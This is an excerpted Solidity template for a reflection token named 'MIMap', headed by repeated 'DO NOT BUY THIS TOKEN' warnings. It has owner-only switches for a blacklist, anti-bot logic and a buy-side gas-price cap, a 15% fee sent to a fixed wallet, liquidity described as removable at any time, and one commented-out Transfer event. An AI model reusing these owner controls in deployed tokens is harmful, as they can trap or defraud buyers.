...
// DO NOT BUY THIS TOKEN. /!\
// ----------------------------------------------
// The creation of this contract is purely private, this token must not be purchased. The contract deployed is a test contract, to test performance & functionality. 
// This token should not be purchased, by any means. Only the owner must buy this token. Liquidity can be added to run private tests. 
// This liquidity can be removed at any time to perform other tests on other contracts. Do not buy this token.
// ----------------------------------------------
// DO NOT BUY THIS TOKEN. /!\
// DO NOT BUY THIS TOKEN. /!\
// DO NOT BUY THIS TOKEN. /!\
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x130966628846BFd36ff31a822705796e8cb8C18D); // update
    address WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7; // update
    IDEXRouter router;
...
contract MIMap is IBEP20, Auth { // update
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x130966628846BFd36ff31a822705796e8cb8C18D; // update
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7; // update
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    bool gasLimit = true;
    uint256 private gasPriceLimit = 40000000000; // 70 nAvax update
    bool antiBotTrue = true;
    bool blacklist = true;

    string constant _name = "MIMap"; // update
    string constant _symbol = "MIMap"; // update
    ...
    uint256 liquidityFee = 0; // update
    uint256 buybackFee = 0; // update
    uint256 reflectionFee = 600; // update
    uint256 marketingFee = 900; // update
    uint256 totalFee = 1500; // update
    uint256 feeDenominator = 10000; // update

    address public autoLiquidityReceiver=0x23D2F6BcAb98Fce352008e44fD993493828De254; // liq address update
    address public marketingFeeReceiver=0x23D2F6BcAb98Fce352008e44fD993493828De254; // marketing address update
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!isSell && gasLimit) {
            require(tx.gasprice <= gasPriceLimit, "Gas price is too high.");
        }
...
//        emit Transfer(sender, recipient, amount);
    ...
    function setGasLimit(bool Argument) external onlyOwner {
        gasLimit = Argument;
    }

    function setAntiBot(bool Argument) external onlyOwner {
        antiBotTrue = Argument;
    }

    function setToggleBlacklist(bool Argument) external onlyOwner {
        blacklist = Argument;
    }

    function setGasPriceLimit(uint Argument) external onlyOwner {
        gasPriceLimit = Argument;
    }

    function getGasLimit() external view returns(bool) {
      return gasLimit;
    }
